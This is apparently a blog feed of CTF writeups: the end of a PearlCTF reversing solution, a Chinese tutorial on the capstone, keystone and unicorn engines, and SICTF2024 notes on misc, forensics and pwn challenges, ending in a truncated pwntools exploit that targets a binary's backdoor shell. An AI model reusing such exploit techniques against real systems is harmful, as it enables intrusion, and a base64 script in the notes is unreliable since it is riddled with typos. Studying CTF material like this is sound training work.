on! Take the sword and fulfill your destiny&quot;)</span><br><span class="line">        print()</span><br><span class="line"></span><br><span class="line">        time.sleep(2)</span><br><span class="line"></span><br><span class="line">        return chain</span><br><span class="line"></span><br><span class="line">    print(&quot;You are not worthy&quot;)</span><br><span class="line">    print(&quot;The fate has you in it&#x27;s grip&quot;)</span><br><span class="line">    print(&quot;You will be forgotten in the sands of time&quot;)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><p>​    </p><p>The input is processed with some xor magic and we check if the result is identical with the values in <code>best</code>. This can be reversed easily:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mod = [117, 84, 87, 108, 59, 85, 66, 71, 71, 30, 16]</span><br><span class="line">plier = 69</span><br><span class="line"></span><br><span class="line">for i in mod:</span><br><span class="line">    print(chr(i^plier),end=&quot;&quot;)</span><br><span class="line">    plier = i ^ plier</span><br></pre></td></tr></table></figure><p>Running this, gives us the last part of the flag <code>0d3_d1s4sm&#125;</code>. The full handcrafted decompile can be found <a href="https://github.com/D13David/ctf-writeups/blob/main/pearlctf24/rev/byteme/byteme.py"><code>here</code></a>.</p><p>Flag <code>pearl&#123;e4sy_p34sy_byt3c0d3_d1s4sm&#125;</code></p><h3 id="not-so-easy"><a href="#not-so-easy" class="headerlink" title="not_so_easy"></a>not_so_easy</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PearlCTF&quot;&gt;&lt;a href=&quot;#PearlCTF&quot; class=&quot;headerlink&quot; title=&quot;PearlCTF&quot;&gt;&lt;/a&gt;PearlCTF&lt;/h1&gt;&lt;h2 id=&quot;Rev&quot;&gt;&lt;a href=&quot;#Rev&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>capstone、keystone与unicorn-1</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/03/01/capstone%E3%80%81keystone%E4%B8%8Eunicorn-1/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/03/01/capstone%E3%80%81keystone%E4%B8%8Eunicorn-1/</id>
    <published>2024-02-29T16:00:00.000Z</published>
    <updated>2024-09-16T07:11:40.310Z</updated>
    
    <content type="html"><![CDATA[<h1 id="capstone、keystone与unicorn-1"><a href="#capstone、keystone与unicorn-1" class="headerlink" title="capstone、keystone与unicorn-1"></a>capstone、keystone与unicorn-1</h1><h2 id="capstone"><a href="#capstone" class="headerlink" title="capstone"></a><strong>capstone</strong></h2><p>加坡南洋理工大学团队在 Blackhat USA 2014 上发布的一个反汇编引擎。</p><p>安装： pip install capstone</p><h3 id="基础示例"><a href="#基础示例" class="headerlink" title="基础示例"></a><strong>基础示例</strong></h3><p>capstone 的 API 使用起来非常简单，因此使用该框架编写工具非常容易。 下面的代码反汇编一些 x86机器码，并打印出汇编语句。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">CODE = <span class="string">b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str))</span><br><span class="line"><span class="comment">#0x1000:pushrbp</span></span><br><span class="line"><span class="comment">#0x1001:movrax, qword ptr [rip + 0x13b8]</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">CODE = <span class="string">b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="keyword">for</span> insn <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> %(insn.address, insn.mnemonic, insn.op_str))</span><br><span class="line">   </span><br><span class="line"><span class="comment">#0x1000:pushrbp</span></span><br><span class="line"><span class="comment">#0x1001:movrax, qword ptr [rip + 0x13b8]</span></span><br></pre></td></tr></table></figure><p>以下是每一行代码的解释：</p><p>第 1 行：导入 Python 模块 capstone。</p><p>第 3 行：要反汇编的原始二进制代码。</p><p>第 5 行：使用类 Cs 为 capstone 初始化 Python 类。 需要给这个类两个参数：硬件架构和硬件模式。</p><p>在此示例中，我们要反汇编 x86 体系结构的 64 位代码。</p><p>第 6 行：使用上面创建的 Cs 类实例的方法 disasm() 反汇编二进制代码。 disasm 的第二个参数是第一</p><p>条指令的地址，在本例中为 0x1000。 默认情况下，disasm 反汇编所有代码，直到没有更多代码或遇</p><p>到不可解释的指令。 disasm 返回一个类型为 CsInsn 的指令列表，这里的 for 循环会迭代这个列表。</p><p>第 7 行：打印出每条指令的一些内部信息。 CsInsn 类公开了反汇编指令的所有内部信息。 下面介绍了</p><p>此类中一些最常用的属性。</p><p>&#x2F;&#x2F;&#x2F;想起来了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_file</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="comment"># 从文件中读取十六进制字符串</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        hex_string = f.read().strip()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将十六进制字符串转换为字节序列</span></span><br><span class="line">    bytes_data = <span class="built_in">bytes</span>.fromhex(hex_string)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将字节序列写入文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bytes_data)</span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&quot;11.txt&quot;</span></span><br><span class="line">output_file = <span class="string">&quot;output&quot;</span>  <span class="comment"># 输出文件为二进制文件，因为十六进制是字节数据</span></span><br><span class="line"></span><br><span class="line">hex_to_file(input_file, output_file)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240229202523536.png" alt="image-20240229202523536"></p><h3 id="更高效的-API"><a href="#更高效的-API" class="headerlink" title="更高效的 API"></a><strong>更高效的</strong> <strong>API</strong></h3><p>上个示例中使用 disasm() 方法获取 CsInsn 对象。这提供了可用于反汇编指令的完整信息。但是，如果我们只需要地址、大小、助记符和 op_str 等基本数据，我们可以使用更轻量级的 API disasm_lite 。</p><p>下面是 disasm_lite 示例</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">CODE = <span class="string">b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="keyword">for</span> address, size, mnemonic, op_str <span class="keyword">in</span> md.disasm_lite(CODE, <span class="number">0x1000</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> %(address, mnemonic, op_str))</span><br></pre></td></tr></table></figure><h3 id="架构和模式"><a href="#架构和模式" class="headerlink" title="架构和模式"></a><strong>架构和模式</strong></h3><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240229204045467.png" alt="image-20240229204045467"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240229204054519.png" alt="image-20240229204054519"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">CODE = <span class="string">b&quot;\x56\x34\x21\x34\xc2\x17\x01\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_MIPS, CS_MODE_MIPS64 + CS_MODE_LITTLE_ENDIAN)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str))</span><br></pre></td></tr></table></figure><h2 id="keystone"><a href="#keystone" class="headerlink" title="keystone"></a><strong>keystone</strong></h2><p>pip install keystone-engine</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line">code = <span class="string">&quot;mov eax, 3 \n&quot;</span> \</span><br><span class="line"><span class="string">&quot;sub edx, eax \n&quot;</span> \</span><br><span class="line"><span class="string">&quot;jmp edx&quot;</span></span><br><span class="line">ks = Ks(KS_ARCH_X86, KS_MODE_32)</span><br><span class="line">encoding, count = ks.asm(code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s (number of statements: %u)&quot;</span> %(encoding, count))</span><br></pre></td></tr></table></figure><p>每行代码的注释：</p><p>第 1 行：在使用之前导入 keystone 模块。</p><p>第 3-5 行：要编译的汇编字符串。 此示例中的代码是 x86 32 位，采用 Intel 格式。 可以用 ; 或</p><p>\n 分隔此字符串中的汇编指令。</p><p>第 7 行：使用类 <strong>Ks</strong> 初始化 keystone。 这个类接受 2 个参数：硬件架构和硬件模式。 此示例处理</p><p>x86 体系结构的 32 位代码。</p><p>第 8 行：使用方法 <strong>asm</strong> 编译汇编指令。 该函数返回一个编码字节列表，以及 keystone 在编译过</p><p>程中处理的输入语句的数量。</p><p>第 9 行：打印出指令编码和处理的汇编语句数。</p><p>默认情况下，keystone 接受采用 Intel 语法的 x86 汇编。 如果要处理 x86 AT&amp;T 语法，可以简单地切换到语法 AT&amp;T，如下所示。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line">code = <span class="string">&quot;movl $3, %eax \n&quot;</span> \</span><br><span class="line"><span class="string">&quot;sub %eax, %edx \n&quot;</span> \</span><br><span class="line"><span class="string">&quot;jmp *%edx&quot;</span></span><br><span class="line">ks = Ks(KS_ARCH_X86, KS_MODE_32)</span><br><span class="line">ks.syntax = KS_OPT_SYNTAX_ATT <span class="comment"># 添加此行</span></span><br><span class="line">encoding, count = ks.asm(code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s (number of statements: %u)&quot;</span> %(encoding, count))</span><br></pre></td></tr></table></figure><h3 id="unicorn"><a href="#unicorn" class="headerlink" title="unicorn"></a><strong>unicorn</strong></h3><p>unicorn 引擎的用处：</p><ul><li><p>从恶意软件中调用一个有趣的函数，而不会创建有害的进程</p></li><li><p>解决 CTF 赛题</p></li><li><p>模糊测试</p></li><li><p>模拟执行混淆代码</p></li></ul><h3 id="任务-1"><a href="#任务-1" class="headerlink" title="任务 1"></a><strong>任务</strong> <strong>1</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当运行这个程序时，我们可以注意到它自己会打印 flag，但速度非常慢，flag 的每个下一个字节的计算速度越来越慢。这意味着有必要优化程序以获得 flag</span></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 这是一个递归函数，我们可以通过 unicorn 来对其进行优化。首先导入 unicorn 模块并实例化一个 Uc 对象：</span></span><br><span class="line">mu = Uc(UC_ARCH_X86,UC_MODE_64)</span><br><span class="line"><span class="comment"># 要使用 unicorn，我们需要手动初始化虚拟内存。 对于这个二进制文件，需要在某处编写代码并分配一个堆栈。二进制文件的基址是 0x400000。 假设堆栈将从地址 0x0 开始，大小为 1024*1024。</span></span><br><span class="line"><span class="comment"># 我们可以通过调用 mem_map 方法来映射一片内存。</span></span><br><span class="line">BASE = <span class="number">0x400000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x0</span></span><br><span class="line">STACK_SIZE = <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">mu.mem_map(BASE, <span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line"><span class="comment"># 现在，我们需要在基地址加载二进制文件，就像加载程序一样，然后将 RSP 设置为指向堆栈的末尾</span></span><br><span class="line">mu.mem_write(BASE, <span class="built_in">open</span>(<span class="string">&quot;./fibonacci&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, STACK_ADDR + STACK_SIZE - <span class="number">8</span>)</span><br><span class="line"><span class="comment"># 来添加一个 hook 监听模拟过程，看看是哪个语句产生了内存访问错误：</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="keyword">for</span> ins <span class="keyword">in</span> cs.disasm(mu.mem_read(address, size), <span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(address), ins.mnemonic, ins.op_str)</span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line"><span class="comment"># 我们可以启动仿真并运行我们的代码，但需要知道起始地址是什么以及仿真器应该在哪里停止。考虑从地址 0x4004E0 开始模拟代码（main 函数首地址），结尾可以是 0x400575：</span></span><br><span class="line">mu.emu_start(<span class="number">0x4004E0</span>, <span class="number">0x400575</span>)</span><br><span class="line"><span class="comment"># 运行却产生了报错：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;Traceback (most recent call last):</span></span><br><span class="line"><span class="string">File &quot;solve.py&quot;, line 15, in &lt;module&gt;</span></span><br><span class="line"><span class="string">mu.emu_start(0x4004E0, 0x400575)</span></span><br><span class="line"><span class="string">File &quot;python38\lib\site-packages\unicorn\unicorn.py&quot;, line 547, in emu_start</span></span><br><span class="line"><span class="string">raise UcError(status)</span></span><br><span class="line"><span class="string">unicorn.unicorn.UcError: Invalid memory read (UC_ERR_READ_UNMAPPED)&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;这段代码添加了一个钩子。我们定义了自己的函数 hook_code，它在每条指令的仿真之前被调用。它需</span></span><br><span class="line"><span class="string">要以下参数：</span></span><br><span class="line"><span class="string">Uc 实例</span></span><br><span class="line"><span class="string">指令地址</span></span><br><span class="line"><span class="string">指令大小</span></span><br><span class="line"><span class="string">用户数据（我们可以在 hook_add() 的可选参数中传递这个值）&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 添加的在里面了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;0x4004e0 push rbp</span></span><br><span class="line"><span class="string">0x4004e1 push rbx</span></span><br><span class="line"><span class="string">0x4004e2 xor esi, esi</span></span><br><span class="line"><span class="string">0x4004e4 mov ebp, 0x4007e1</span></span><br><span class="line"><span class="string">0x4004e9 xor ebx, ebx</span></span><br><span class="line"><span class="string">0x4004eb sub rsp, 0x18</span></span><br><span class="line"><span class="string">0x4004ef mov rdi, qword ptr [rip + 0x200b42]</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240229212524751.png" alt="image-20240229212524751"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line"><span class="keyword">if</span> address <span class="keyword">in</span> [<span class="number">0x4004EF</span>, <span class="number">0x4004F6</span>, <span class="number">0x400502</span>, <span class="number">0x40054F</span>, <span class="number">0x400560</span>]:</span><br><span class="line">mu.reg_write(UC_X86_REG_RIP, address + size)</span><br><span class="line"><span class="keyword">if</span> address == <span class="number">0x400560</span>:</span><br><span class="line">value = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(value))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;capstone、keystone与unicorn-1&quot;&gt;&lt;a href=&quot;#capstone、keystone与unicorn-1&quot; class=&quot;headerlink&quot; title=&quot;capstone、keystone与unicorn-1&quot;&gt;&lt;/a&gt;capst</summary>
      
    
    
    
    
    <category term="RE CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/RE-CTF/"/>
    
  </entry>
  
  <entry>
    <title>SICTF2024</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/SICTF2024/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/SICTF2024/</id>
    <published>2024-02-25T16:00:00.000Z</published>
    <updated>2024-09-16T07:11:16.081Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SICTF2024"><a href="#SICTF2024" class="headerlink" title="SICTF2024"></a>SICTF2024</h1><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="真💨签到"><a href="#真💨签到" class="headerlink" title="真💨签到"></a>真💨签到</h3><ul><li>加密zip文件包最后一串数字，5456545454565458414259555854585458434152595958415a435959595558563d<ul><li>16进制转字符TVTTTVTXABYUXTXTXCARYYXAZCYYYUXV&#x3D;</li><li><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=zimu">字符文本解密</a> 2024HappyNewYear</li></ul></li><li>zip解压后一个音频一个图片<ul><li>音频用Audacity <strong>注意音频名称</strong></li><li>用steghide解码  steghide extract -sf steg.jpg</li></ul></li></ul><h3 id="New-Year’s-regret"><a href="#New-Year’s-regret" class="headerlink" title="New Year’s regret"></a>New Year’s regret</h3><ul><li><p>密码是2024SICTF</p></li><li><p>01画图（赛博厨子），汉信码，以及压缩包末尾发现字符串，尝试hex编码（考虑逆向输入）</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;43637d135333&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment">#333531d73634--&gt;351×64</span></span><br></pre></td></tr></table></figure><p>画图：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX1=<span class="number">351</span></span><br><span class="line">MAX2=<span class="number">64</span></span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX1,MAX2))</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;01码&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX2):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX1):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">str</span>[i]==<span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240226121035339.png" alt="image-20240226121035339"></p><ul><li>music-sheet-cipher解码得一部分：</li></ul><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240226121133988.png" alt="image-20240226121133988"></p><ul><li><p>010另一文件有压缩包和png图片，kali分离<br>压缩包解压base64循环</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bases64 <span class="keyword">import</span> b64ecode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_data</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data=re.sub(<span class="string">r&#x27;flag|[⼀-龥]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,data)</span><br><span class="line">        decode_data=b64ecode(data)</span><br><span class="line">        <span class="keyword">return</span> decode_data.decode(),<span class="literal">True</span></span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> data.<span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag_new.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;ute-8&#x27;</span>)<span class="keyword">as</span> file:</span><br><span class="line">    date = file.read()</span><br><span class="line">iterations = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data,can_decode=process_data(data)</span><br><span class="line">    iterations+=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> can_decode:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;result&quot;</span>,data)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;rotatin&quot;</span>,iterations)</span><br><span class="line">        braek</span><br></pre></td></tr></table></figure></li><li><p>战双帕米什武器星级，，，</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">44664654464566654465645644544664654654644546445446646565444454544664654664544545646454544454466465465645644</span><br></pre></td></tr></table></figure><p>考虑摩斯密码，4为”.”,6”-“,5为空格</p><p>三部分拼起来</p></li></ul></li></ul><h3 id="GeekChallege"><a href="#GeekChallege" class="headerlink" title="GeekChallege"></a>GeekChallege</h3><h3 id="神秘的流量"><a href="#神秘的流量" class="headerlink" title="神秘的流量"></a>神秘的流量</h3><p><em>题⽬描述：</em></p><p><em>flag值：SICTF{b50936c7-b60d-411e-a91f-304937164b9c}</em></p><p><a href="https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py">https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py</a></p><p><a href="https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py">https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py</a></p><p>使⽤ cs-extract-key.py ⼯具 可以得到 AES key : HMAC key</p><p>然后⽤ cs-parse-http-traffic.py 就可以拿到明⽂</p><p>参考资料：</p><p><a href="https://fdlucifer.github.io/2022/01/05/decrypt-cs-traffic/">https://fdlucifer.github.io/2022/01/05/decrypt-cs-traffic/</a></p><h3 id="WHO？WHO？WHO？"><a href="#WHO？WHO？WHO？" class="headerlink" title="WHO？WHO？WHO？"></a>WHO？WHO？WHO？</h3><p>1、archpr爆破密码为qweqwe</p><p>2、使⽤零宽后得到⼀串rabbit解密，且密码就是问题的答案，密码为shumu</p><p>3、根据⽂件题⽬提⽰使⽤DNA解密得到flag</p><h3 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析 1"></a>日志分析 1</h3><p>SICTF{黑客所接入的IP地址|黑客所创建的用户名|黑客所加入的用户组|黑客创建的计划名|创建计划任务的对象后门所处的路径（小写盘符……,后门路径精确到****.exe）|黑客远程登陆RDP的账户}<br> 后门路径精确到****.exe</p><p>直接使用windows工具筛查</p><p>{192.168.222.200|attack$|Administrators|callback|c:\windows\system32\windows_at*</p><p><em>tack.exe|ADOFLMB\attack$}</em></p><h3 id="日志分析2"><a href="#日志分析2" class="headerlink" title="日志分析2"></a>日志分析2</h3><p><em>SICTF{攻击者的IP地址|攻击者得到Web应⽤后台管理权限的⽅法|攻击者在SQL注⼊攻击过程中使⽤</em></p><p><em>的⾃动化⼯具名称|⼯具版本号|攻击者使⽤的Webshell连接⼯具（中⽂名）|⼯具版本号}</em></p><p><em>flag值：SICTF{10.11.35.95|暴⼒破解|sqlmap|1.2.4.18|蚁剑|2.1}</em></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Signin-pwn"><a href="#Signin-pwn" class="headerlink" title="Signin-pwn"></a>Signin-pwn</h3><p>read之后调⽤了strlen，就会把rdi设置为bug的地址，所以只需要buf以&#x2F;bin&#x2F;sh开头，然后直接改返回地址到backdoor的system那⾥即可</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">backdoor=<span class="number">0x4011f4</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;length:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span 